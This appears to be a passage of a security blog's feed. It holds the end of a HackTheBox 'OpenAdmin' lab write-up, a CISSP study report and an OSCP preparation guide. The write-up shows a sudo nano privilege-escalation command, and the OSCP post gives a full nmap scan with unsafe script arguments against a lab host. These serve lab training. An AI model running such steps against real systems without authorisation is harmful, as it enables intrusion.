&lt;img src=&quot;\assets\images\htb\openadmin\user-openadmin.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;privilege-escalation&quot;&gt;Privilege Escalation&lt;/h2&gt;

&lt;p&gt;Interesting sudo finding:
&lt;img src=&quot;\assets\images\htb\openadmin\sudo-openadmin.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;GTFOBins shows us we can get a shell with Nano, let’s try it.
&lt;img src=&quot;\assets\images\htb\openadmin\sudo_gtfobins-openadmin.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo /bin/nano /opt/priv&lt;/code&gt;
&lt;img src=&quot;\assets\images\htb\openadmin\root-openadmin.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Got Root! Thanks for reading.&lt;/p&gt;</content><author><name>J.D. Grow</name></author><category term="hackthebox" /><category term="hackthebox" /><category term="hacking" /><category term="penetration testing" /><category term="write-ups" /><summary type="html">OpenAdmin was a fun, easy machine with an interesting internal web application.</summary></entry><entry><title type="html">CISSP After-Action Report</title><link href="https://gr0sabi.github.io/certification/cissp-after-action-report/" rel="alternate" type="text/html" title="CISSP After-Action Report" /><published>2019-03-16T00:00:00-04:00</published><updated>2019-03-16T00:00:00-04:00</updated><id>https://gr0sabi.github.io/certification/cissp-after-action-report</id><content type="html" xml:base="https://gr0sabi.github.io/certification/cissp-after-action-report/">&lt;p&gt;&lt;img src=&quot;/assets/images/cissp-post/CISSP.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h2 id=&quot;tldr&quot;&gt;TL;DR&lt;/h2&gt;
&lt;p&gt;On 18 February 2020, I “provisionally passed” the CISSP examination on my first attempt at 100 questions with self-study. I’m writing this post to give back to the community some of my study practices that allowed me to conquer this beast of an exam. The &lt;a href=&quot;https://reddit.com/r/cissp&quot; target=&quot;_blank&quot;&gt;r/CISSP&lt;/a&gt; Reddit Community was instrumental in their general guidance, after-action reports and recommended study materials. Therefore, in order to tell them everything they already know &lt;strong&gt;BUT&lt;/strong&gt; especially to &lt;em&gt;reinforce&lt;/em&gt; everything they already know, this is what I did:&lt;/p&gt;

&lt;h2 id=&quot;resources-used&quot;&gt;Resources Used&lt;/h2&gt;

&lt;p&gt;Books I used:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://amzn.to/39M9hnM&quot; target=&quot;_blank&quot;&gt;Eleventh Hour CISSP: Study Guide&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://amzn.to/2SF6Duj&quot; target=&quot;_blank&quot;&gt;Sybex (ISC)² CISSP Official Study Guide&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Audio Book:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://amzn.to/37DkEg8&quot; target=&quot;_blank&quot;&gt;Essential CISSP Exam Guide Audiobook&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Testing Engines:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.boson.com/practice-exam/cissp-isc2-practice-exam&quot; target=&quot;_blank&quot;&gt;Boson Ex-Sim Max Practice Exams&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;Pearson Practice Tests via &lt;a href=&quot;https://learning.oreilly.com/&quot; target=&quot;_blank&quot;&gt;O’Reilly Learning&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;Wiley Online Exams/Questions (from purchasing Sybex Book)&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Videos:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.cybrary.it/&quot; target=&quot;_blank&quot;&gt;Kelly Handerhan CISSP Course via Cybrary&lt;/a&gt; (While it was free!)&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://youtu.be/jZSAZ1neFZk&quot; target=&quot;_blank&quot;&gt;IT Dojo Question of the Day&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Quick Review:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;http://luc.desfosses.fr/CISSP/&quot; target=&quot;_blank&quot;&gt;Awesome Fellow Redditor CISSP Notes&lt;/a&gt; (This is great for a quick review.)&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;I was fortunate enough to get access to &lt;a href=&quot;https://learning.oreilly.com/&quot; target=&quot;_blank&quot;&gt;O’Reilly Learning&lt;/a&gt; provided by my employer, so if you can swing that it will get you access to all the books (and much more). If you have never had Audible, you should be able to get a free or inexpensive trial period for the Essential CISSP audiobook. Boson Practice Exams are &lt;em&gt;no doubt&lt;/em&gt; one of the best resources you can get because of the way they word the questions &lt;em&gt;and explain the answers&lt;/em&gt;. Do read all the answers to get the true value of these exams. The product normally goes for $99, but they frequently run sales.&lt;/p&gt;

&lt;h3 id=&quot;previous-experience&quot;&gt;Previous Experience&lt;/h3&gt;

&lt;p&gt;To get view into my professional experience, take a look at my &lt;a href=&quot;https://www.linkedin.com/in/johngrow/&quot;&gt;LinkedIn&lt;/a&gt;. I’ve worked in Government/Military Information Security &amp;amp; IT roles for quite a while, but still felt very far from where I needed to be to conquer this exam. I identified pretty early on that my trouble domain was going to be Domain 8 - SDLC!&lt;/p&gt;

&lt;h2 id=&quot;a-working-fathers-study-plan&quot;&gt;A Working Father’s Study Plan&lt;/h2&gt;

&lt;p&gt;60 Days total study-time was my goal.&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Days 1 - 15
├── Essential CISSP (Listened during commute DAILY)
├── IT Dojo Question of the Day (I watched around 25% of the videos)
├── Cybrary CISSP (Kelly Handerhan) 1.25x Speed - Take Notes!
└── Read CISSP 11th Hour

Days 15 - 45
├── Bi Weekly Tests (Boson/Wiley) (Identify weak areas)
├── Read the Sybex OSG! Must be done within 30 days. (See Book Attack Plan Below)
└── Deepen notes while reading. Skim all major references (i.e., NIST Special Pubs, ISO, etc.).

Days 45 - 60
├── Daily Practice Tests (Settings: 20-50 Question Tests; &amp;gt;3 Right Boson OR Pearson)
└── Deep Dive Key Processes (SDLC, RMF, BCP/DR, etc.)

Days 53 - 60 
├── Daily FULL Tests (Settings: &amp;gt;4-5 Right Boson OR Pearson) &amp;amp; Full Notes Review
└── Read CISSP 11th Hour (A Few Days Before Exam)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;With Boson, at the end of the exam it will show you a listing of all the references. My advice is to open all the external references and read them. In addition, I did a lot of Googling, solidifying my knowledge with various sources in areas I felt I was weak on.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/cissp-post/everything-is-fine.gif&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h2 id=&quot;book-attack-plan&quot;&gt;Book Attack Plan&lt;/h2&gt;

&lt;p&gt;I wanted to take no longer than a month to digest the book. On average, it takes roughly 32 hours to read based on read-time metrics found on O’Reilly Learning. Below is how I broke down the book to hold myself accountable to a plan.&lt;/p&gt;

&lt;h3 id=&quot;week-1-domain-1--2&quot;&gt;Week 1: Domain 1 &amp;amp; 2&lt;/h3&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Domain 1: Security and Risk Management (315 mins)
├── Chapter 1 Security Governance Through Principles and Policies (103:30 mins) 
├── Chapter 2 Personnel Security and Risk Management Concepts (94:18 mins) 
├── Chapter 3 Business Continuity Planning (51:45 mins) 
└── Chapter 4 Laws, Regulations, and Compliance (63:15 mins) 

Domain 2: Asset Security (71 mins) 
└── Chapter 5 Protecting Security of Assets (71:18 mins)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h3 id=&quot;week-2-domain-3&quot;&gt;Week 2: Domain 3&lt;/h3&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Domain 3: Security Architecture and Engineering (489 mins)
├── Chapter 6 Cryptography and Symmetric Key Algorithms (70:09 mins)
├── Chapter 7 PKI and Cryptographic Applications (67:51 mins)
├── Chapter 8 Principles of Security Models, Design, and Capabilities (85:06 mins)
├── Chapter 9 Security Vulnerabilities, Threats, and Countermeasures (182:51 mins)
└── Chapter 10 Physical Security Requirements (80:30 mins)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h3 id=&quot;week-3-domain-4-5--6&quot;&gt;Week 3: Domain 4, 5 &amp;amp; 6&lt;/h3&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Domain 4: Communication and Network Security (278 mins)
├── Chapter 11 Secure Network Architecture and Securing Network Components (162:09 mins)
└── Chapter 12 Secure Communications and Network Attacks (114:60 mins)

Domain 5: Identity and Access Management (165 mins)
├── Chapter 13 Managing Identity and Authentication (88:33 mins)
└── Chapter 14 Controlling and Monitoring Access (75:54 mins)

Domain 6: Security Assessment and Testing (60 mins)
└── Chapter 15 Security Assessment and Testing (59:48 mins)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;week-4-domain-7--8&quot;&gt;Week 4: Domain 7 &amp;amp; 8&lt;/h3&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Domain 7: Security Operations (349 mins)
├── Chapter 16 Managing Security Operations (79:21 mins)
├── Chapter 17 Preventing and Responding to Incidents (134:33 mins)
├── Chapter 18 Disaster Recovery Planning (85:06 mins)
└── Chapter 19 Investigations and Ethics (47:09 mins)
 
Domain 8: Software Development Security (152 mins)
├── Chapter 20 Software Development Security (86:15 mins)
└── Chapter 21 Malicious Code and Application Attacks (64:24 mins)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;timeline&quot;&gt;Timeline&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;18Feb2020:   Exam Passed&lt;/li&gt;
  &lt;li&gt;19Feb2020:   (ISC)² Email Received and Endorsement Application Submitted&lt;/li&gt;
  &lt;li&gt;19Feb2020:   Member endorsed my application and (ISC)² received endorsement documentation and have placed it in queue.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;em&gt;The Long Wait Begins…&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/cissp-post/cookie-monster.gif&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;16Mar2020:   Received a Congratulations/Approved Application email from (ISC)², but it did not let me pay my AMF fees right away. But hey, 26 days from endorsement… not bad!&lt;/li&gt;
  &lt;li&gt;16Mar2020:   It finally showed the link to pay my fees, $125 later and I’m “officially” a CISSP.&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;thanks&quot;&gt;Thanks!&lt;/h2&gt;

&lt;p&gt;Overall, not a bad experience and I’m glad it’s behind me. Looking forward to getting back to deep diving AWAE from Offensive Security, and hopefully come out with OSWE this year.&lt;/p&gt;

&lt;p&gt;Good luck future CISSPs, be confident in your knowledge, and DM me on &lt;a href=&quot;https://twitter.com/gr0sabi&quot; target=&quot;_blank&quot;&gt;Twitter&lt;/a&gt; if you need anything.&lt;/p&gt;</content><author><name>J.D. Grow</name></author><category term="certification" /><category term="cissp" /><category term="certification" /><category term="study advice" /><category term="best practices" /><summary type="html">On 18 February 2020, I provisionally passed the CISSP examination on my first attempt at 100 questions with self-study. I'm writing this post to give back to the community some of my practices of study that allowed me to conquer this beast of an exam.</summary></entry><entry><title type="html">OSCP: Insights, Best Practices, and Resources</title><link href="https://gr0sabi.github.io/certification/oscp-insights-best-practices-resources/" rel="alternate" type="text/html" title="OSCP: Insights, Best Practices, and Resources" /><published>2019-02-16T00:00:00-05:00</published><updated>2019-02-16T00:00:00-05:00</updated><id>https://gr0sabi.github.io/certification/oscp-insights-best-practices-resources</id><content type="html" xml:base="https://gr0sabi.github.io/certification/oscp-insights-best-practices-resources/">&lt;p&gt;&lt;img src=&quot;/assets/images/oscp-post/offsec-oscp.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h2 id=&quot;purpose&quot;&gt;Purpose&lt;/h2&gt;
&lt;p&gt;I wrote this post to give back some of the insights I’ve discovered on my journey to becoming an OSCP. It will cover personal insights, resources, and best practices. There is &lt;em&gt;a lot&lt;/em&gt; of great information available on the Internet so I will make an honest effort not to sound like a broken record.&lt;/p&gt;

&lt;h3 id=&quot;a-little-about-me&quot;&gt;A Little About Me&lt;/h3&gt;
&lt;p&gt;Going into the certification I held a B.S. in Information and Computer Science and was actively certified a CCNA, CEH, Sec+, Net+ and A+. In the IT realm, I’ve got Network Engineering experience with mobile Cisco deployments and System Administration experience on both Linux and Windows Domains. But, like most readers of this post, &lt;em&gt;I wanted to step it up a notch&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;&lt;sub&gt;&lt;strong&gt;Note&lt;/strong&gt;:  I feel that CEH did &lt;em&gt;very little&lt;/em&gt; to prepare me for OSCP. It’s essentially a requirement for my current employment, as an &lt;a href=&quot;https://iase.disa.mil/iawip/pages/iabaseline.aspx&quot;&gt;approved baseline certification&lt;/a&gt;. CCNA was more useful, in my opinion.&lt;/sub&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://media.giphy.com/media/NFA61GS9qKZ68/giphy.gif&quot; width=&quot;50%&quot; alt=&quot;Strategy&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;pre-pwk-preparation&quot;&gt;Pre-PWK Preparation&lt;/h2&gt;
&lt;p&gt;Albeit a decent background in Information Technology, I felt inadequately prepared. My professional experience gave me some requisite knowledge in networking, development, and various operating system flavors. But, I needed more knowledge. Here are some of the things I did that I think served me well prior to PWK.&lt;/p&gt;

&lt;h3 id=&quot;reading&quot;&gt;Reading&lt;/h3&gt;
&lt;p&gt;I read (lurked) &lt;em&gt;nearly&lt;/em&gt; every post on the &lt;a href=&quot;https://www.reddit.com/r/oscp&quot; target=&quot;_blank&quot;&gt;OSCP subreddit&lt;/a&gt;. I found it very useful to get into this community and get an understanding of some of the best practices (and struggles) associated with pursuing the certification. For the non-Redditor, sort by &lt;strong&gt;Top&lt;/strong&gt; and &lt;strong&gt;All Time&lt;/strong&gt; for great resources and sage advice.&lt;/p&gt;

&lt;p&gt;The following books I read and found useful, but can go beyond the scope of OSCP:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://amzn.to/2I78dB2&quot; target=&quot;_blank&quot;&gt;Grey Hat Hacking&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://amzn.to/2D25qF0&quot; target=&quot;_blank&quot;&gt;The Web Application Hacker’s Handbook, 2nd Ed.&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://amzn.to/2UzD1jR&quot; target=&quot;_blank&quot;&gt;Violent Python&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://amzn.to/2IaXF3Q&quot; target=&quot;_blank&quot;&gt;Black Hat Python&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;sub&gt;&lt;strong&gt;Note&lt;/strong&gt;:  I scooped up a couple Humble Book Bundles from &lt;a href=&quot;https://www.goodreads.com/list/show/126519.Humble_Book_Bundle_Cybersecurity_2_0_by_Wiley&quot;&gt;Wiley&lt;/a&gt; and &lt;a href=&quot;https://www.goodreads.com/list/show/130690.humble_bundle_hacking_for_the_holidays&quot;&gt;No Starch Press&lt;/a&gt; on Hacking, so keep your eyes peeled for those. I got around 30 books for $30 USD, and a sizable portion of the purchase goes to charity. Most of the books were beyond the scope of OSCP, but were good reading, and work well to get in the proper mindset.&lt;/sub&gt;&lt;/p&gt;

&lt;h3 id=&quot;videos&quot;&gt;Videos&lt;/h3&gt;
&lt;p&gt;I watched every &lt;a href=&quot;https://www.youtube.com/channel/UCa6eh7gCkpPo5XXUDfygQQA/videos&quot; target=&quot;_blank&quot;&gt;ippsec YouTube&lt;/a&gt; video and took notes on tools, tips, commands and methodology. This takes a lot of time - but it’s worth every second. If I didn’t understand an exploit or method, I googled it and did some reading. This is phenomenal for seeing an experienced penetration testing methodology in action.&lt;/p&gt;

&lt;h3 id=&quot;hackthebox&quot;&gt;HackTheBox&lt;/h3&gt;
&lt;p&gt;Another invaluable resource to go along side of &lt;a href=&quot;https://www.youtube.com/channel/UCa6eh7gCkpPo5XXUDfygQQA/videos&quot; target=&quot;_blank&quot;&gt;ippsec’s videos&lt;/a&gt; is &lt;a href=&quot;https://www.hackthebox.eu/&quot; target=&quot;_blank&quot;&gt;HackTheBox&lt;/a&gt;. I purchased a VIP membership for about 6 months prior to PWK and spent time attacking their boxes and doing various challenges. &lt;em&gt;This is extremely useful.&lt;/em&gt; It’s true that some of the machines are unlike the PWK network because HTB can be kind of CTF-oriented and/or out-of-scope within the &lt;a href=&quot;https://www.offensive-security.com/information-security-training/penetration-testing-training-kali-linux/&quot; target=&quot;_blank&quot;&gt;PWK&lt;/a&gt; material, but that does not matter in my opinion. Working within the Kali environment, learning the tools and developing a solid pen-testing methodology is what matters here.&lt;/p&gt;

&lt;p&gt;&lt;sub&gt;&lt;strong&gt;Note&lt;/strong&gt;:  I did not use &lt;a href=&quot;https://www.vulnhub.com/&quot; target=&quot;_blank&quot;&gt;VulnHub&lt;/a&gt;, but I &lt;a href=&quot;https://www.abatchy.com/2017/02/oscp-like-vulnhub-vms&quot; target=&quot;_blank&quot;&gt;read&lt;/a&gt; that some of the machines are similar to exploiting some of the PWK Lab machines.&lt;/sub&gt;&lt;/p&gt;

&lt;h3 id=&quot;note-taking&quot;&gt;Note-Taking&lt;/h3&gt;

&lt;p&gt;&lt;em&gt;OneNote&lt;/em&gt;. I used OneNote extensively with all the HTB machines and got very familiar with the application. Within OneNote I created a PenTest Notebook that I could put all my favorite commands, shells, tools, overflow processes, screenshots, etc. Basically, anything I found myself looking up repetitively and needing to copy/paste frequently.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;A definite plus is that it syncs to OneDrive and backs up all your data.&lt;/li&gt;
  &lt;li&gt;It has web and mobile applications that you can use remotely.&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;useful-resources&quot;&gt;Useful Resources&lt;/h2&gt;
&lt;p&gt;Below are excellent online resources that I utilized:&lt;/p&gt;

&lt;h3 id=&quot;linux&quot;&gt;Linux&lt;/h3&gt;
&lt;p&gt;&lt;a href=&quot;https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/&quot; target=&quot;_blank&quot;&gt;Basic Linux Enumeration by g0tmi1k&lt;/a&gt;&lt;br /&gt;
&lt;a href=&quot;https://guif.re/linuxeop&quot; target=&quot;_blank&quot;&gt;Linux Privilege Escalation by Guifre Ruiz&lt;/a&gt;&lt;br /&gt;
&lt;a href=&quot;https://gtfobins.github.io/&quot; target=&quot;_blank&quot;&gt;GTFOBins Project&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&quot;windows&quot;&gt;Windows&lt;/h3&gt;
&lt;p&gt;&lt;a href=&quot;http://www.fuzzysecurity.com/tutorials/16.html&quot; target=&quot;_blank&quot;&gt;Windows Privilege Escalation Fundamentals by FuzzySecurity&lt;/a&gt;&lt;br /&gt;
&lt;a href=&quot;https://guif.re/windowseop&quot; target=&quot;_blank&quot;&gt;Windows Privilege EoP by Guifre Ruiz&lt;/a&gt;&lt;br /&gt;
&lt;a href=&quot;https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/&quot; target=&quot;_blank&quot;&gt;Windows Privilege Escalation Guide by Absolomb&lt;/a&gt;&lt;br /&gt;
&lt;a href=&quot;https://lolbas-project.github.io/#&quot; target=&quot;_blank&quot;&gt;LOLBAS Project&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&quot;pentesting&quot;&gt;Pentesting&lt;/h3&gt;
&lt;p&gt;&lt;a href=&quot;https://bitvijays.github.io/index.html&quot; target=&quot;_blank&quot;&gt;The Magic of Learning&lt;/a&gt;&lt;br /&gt;
&lt;a href=&quot;https://pen-testing.sans.org/resources/downloads&quot; target=&quot;_blank&quot;&gt;SANS Penetration Testing Resources&lt;/a&gt;&lt;br /&gt;
&lt;a href=&quot;https://artkond.com/2017/03/23/pivoting-guide/&quot; target=&quot;_blank&quot;&gt;A Red Teamer’s Guide to Pivoting by Artem Kondratenko&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&quot;stack-based-buffer-overflow&quot;&gt;Stack-Based Buffer Overflow&lt;/h3&gt;
&lt;p&gt;&lt;a href=&quot;https://github.com/justinsteven/dostackbufferoverflowgood&quot; target=&quot;_blank&quot;&gt;The Presentation and Tutorial for Cross-Site Scripters Who Can’t Stack Buffer Overflow Good and Want to Do Other Stuff Good Too&lt;/a&gt;&lt;br /&gt;
&lt;a href=&quot;https://veteransec.com/2018/09/10/32-bit-windows-buffer-overflows-made-easy/&quot; target=&quot;_blank&quot;&gt;VeteranSec’s 32-Bit Windows Buffer Overflows Made Easy&lt;/a&gt;&lt;br /&gt;
&lt;a href=&quot;https://www.corelan.be/index.php/2009/07/19/exploit-writing-tutorial-part-1-stack-based-overflows/&quot; target=&quot;_blank&quot;&gt;Exploit Writing Tutorial: Stack Based Overflows by Corelanc0d3r&lt;/a&gt;&lt;br /&gt;
&lt;a href=&quot;https://www.corelan.be/index.php/2011/07/14/mona-py-the-manual/&quot; target=&quot;_blank&quot;&gt;Mona.py - The Manual by Corelanc0d3r&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&quot;oscp-specific-guides&quot;&gt;OSCP Specific Guides&lt;/h3&gt;
&lt;p&gt;&lt;a href=&quot;https://scund00r.com/all/oscp/2018/02/25/passing-oscp.html&quot; target=&quot;_blank&quot;&gt;Passing OSCP by Scund00r&lt;/a&gt;&lt;br /&gt;
&lt;a href=&quot;https://awakened1712.github.io/oscp/oscp-lfi-rfi/&quot; target=&quot;_blank&quot;&gt;OSCP: RFI and LFI by Awakened&lt;/a&gt;&lt;br /&gt;
&lt;a href=&quot;https://awakened1712.github.io/oscp/oscp-transfer-files/&quot; target=&quot;_blank&quot;&gt;OSCP: Transfer Files from Kali to the Target Machine by Awakened&lt;/a&gt;&lt;br /&gt;
&lt;a href=&quot;https://sushant747.gitbooks.io/total-oscp-guide/&quot; target=&quot;_blank&quot;&gt;Total OSCP Guide by Sushant747&lt;/a&gt;&lt;br /&gt;
&lt;a href=&quot;https://github.com/rewardone/OSCPRepo&quot; target=&quot;_blank&quot;&gt;OSCP Repo by Rewardone&lt;/a&gt;&lt;/p&gt;

&lt;h2 id=&quot;my-experience-with-pwk&quot;&gt;My Experience with PWK&lt;/h2&gt;
&lt;p&gt;I signed up for the 60 day lab time, of which life only allowed probably 35-40 days of that. I took a week of leave from work to spend dedicated time doing all the exercises and course material initially. The course materials (Lectures and Course Guide) teach you everything you need to know to successfully compromise machines with Kali Linux within the Lab network.&lt;/p&gt;

&lt;p&gt;Afterwards, I was able to fully compromise about 90% of the machines. I took field notes and screenshots on every machine as if I were going to write a report on them. I created a map of the entire lab network(s) so I could track my overall progress and coverage.&lt;/p&gt;

&lt;p&gt;I scheduled my exam for day 58 of my lab time. As test day approached, I did not spend any time attacking the remaining machines but focused more on test-day preparations and brushing up my buffer overflow process.&lt;/p&gt;

&lt;p&gt;&lt;sub&gt;&lt;strong&gt;Note&lt;/strong&gt;:  I did &lt;em&gt;not&lt;/em&gt; submit a lab report because I did not want to writeup 10 machines for a 5 point differential. I reasoned that my study time would be better spent in the lab. Yet, I did do &lt;em&gt;all exercises&lt;/em&gt; and recorded my answers. I recommend that if you have the time, do the lab report and submit it.&lt;/sub&gt;&lt;/p&gt;

&lt;h3 id=&quot;forum-and-independent-research&quot;&gt;Forum and Independent Research&lt;/h3&gt;
&lt;p&gt;Whenever I found myself 100% stuck with no other resource, I utilized the OffSec forums, which can more or less guide you in a better direction. Obviously, it’s better to not use it because it can be sometimes a little too “hinty”. You &lt;strong&gt;must&lt;/strong&gt; be able to &lt;em&gt;eventually&lt;/em&gt; research independently and not lean on the OffSec Student forum.&lt;/p&gt;

&lt;h2 id=&quot;exam-strategy&quot;&gt;Exam Strategy&lt;/h2&gt;
&lt;p&gt;Naturally, I will not talk about what’s on the exam but focus on key points.&lt;/p&gt;

&lt;p&gt;Thoroughly read and completely understand the &lt;a href=&quot;https://support.offensive-security.com/oscp-exam-guide/&quot; target=&quot;_blank&quot;&gt;test guide&lt;/a&gt; prior to sitting the challenge. &lt;em&gt;I’ve noticed it is updated fairly regularly.&lt;/em&gt; Reading about other experiences, simple errors on the report and missing key details on the guidance have led to a failure, despite fully compromising all machines.&lt;/p&gt;

&lt;p&gt;&lt;em&gt;Food&lt;/em&gt;. I planned my food prior to the exam to give me one less thing to focus on that day. I chose food and beverages that would keep my energy levels up and not make me lethargic.&lt;/p&gt;

&lt;p&gt;&lt;em&gt;Music&lt;/em&gt;. I prefer music when I’m focusing or studying, so I had a few playlists planned out. During the exam, I had music on Spotify the entire time to keep me in my comfort zone.&lt;/p&gt;

&lt;p&gt;&lt;em&gt;Sleep&lt;/em&gt;. One thing I could have done better was getting &lt;em&gt;better&lt;/em&gt; sleep prior to exam day - my brain did not want to sleep that night (probably due to anxiety), so I was slightly sleep-deprived during the exam.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://media.giphy.com/media/LTYT5GTIiAMBa/giphy.gif&quot; width=&quot;50%&quot; alt=&quot;Sleepy&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;testing-vm&quot;&gt;Testing VM&lt;/h3&gt;
&lt;p&gt;I used a fully updated &lt;a href=&quot;https://www.offensive-security.com/kali-linux-vm-vmware-virtualbox-image-download/&quot; target=&quot;_blank&quot;&gt;64-bit Kali VirtualBox VM&lt;/a&gt; within my personal Windows 10 host machine, but I had the provided PWK Kali VMWare VM on standby, if needed. I personally did not have any issues with this configuration during the exam and is a chance I took against the recommendation of Offensive Security.&lt;/p&gt;

&lt;h3 id=&quot;oscp-exam-challenge&quot;&gt;OSCP Exam Challenge&lt;/h3&gt;
&lt;p&gt;I concur with others in the community and believe that utilizing &lt;a href=&quot;https://github.com/codingo/Reconnoitre&quot; target=&quot;_blank&quot;&gt;Reconnoitre&lt;/a&gt; while knocking out the Buffer Overflow is the most efficient way to begin the exam. Obviously, test and become familiar with Reconnoitre’s usage and outputs &lt;strong&gt;prior&lt;/strong&gt; to the exam if you choose to use it. This is the Nmap command line that Reconnoitre used for a single machine, using a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;--services&lt;/code&gt; argument:&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nmap -vv -Pn --disable-arp-ping -sS -A -sC -p- -T 3 -script-args=unsafe=1 -n -oN /root/Documents/PWK/OSCP/boxes/192.168.XX.XX/scans/192.168.XX.XX.nmap -oX /root/Documents/PWK/OSCP/boxes/192.168.XX.XX/scans/192.168.XX.XX_nmap_scan_import.xml 192.168.XX.XX
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;In regards to the &lt;a href=&quot;https://support.offensive-security.com/oscp-exam-guide/#section-1-exam-requirements&quot; target=&quot;_blank&quot;&gt;&lt;em&gt;single use&lt;/em&gt;&lt;/a&gt; of Metasploit Modules and Meterpreter, I saved it until I &lt;em&gt;thoroughly&lt;/em&gt; attempted every remaining machine &lt;strong&gt;manually&lt;/strong&gt;. This strategy worked out in my favor, so it is good practice in the PWK Lab environment to attempt to compromise all machines manually.&lt;/p&gt;

&lt;p&gt;I recorded the entire exam with &lt;a href=&quot;https://obsproject.com/&quot; target=&quot;_blank&quot;&gt;OBS&lt;/a&gt;, following the advice of many. This was &lt;em&gt;very&lt;/em&gt; useful, as I missed a couple screenshots that I thought were useful for the report.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Update&lt;/strong&gt;:  Offensive Security has changed their policy in regards to screen recording and &lt;em&gt;no longer allows&lt;/em&gt; this to be done. See &lt;a href=&quot;https://www.offensive-security.com/faq/#screen-recording&quot;&gt;“Can I record my screen when taking the exam?”&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;The proctors were not an issue and were professional and unobtrusive. The webcam and communication with them was smooth, other than a single webcam restart.&lt;/p&gt;

&lt;h4 id=&quot;progress-checklist&quot;&gt;Progress Checklist&lt;/h4&gt;
&lt;p&gt;Within OneNote, I created a “Progress Checklist” tab, so I didn’t miss any major items. I modified it to fit the exam scope once I received the instructions. This was the basic structure:&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Progress Checklist
├── Box 1 - 192.168.X.X
│   ├── local.txt
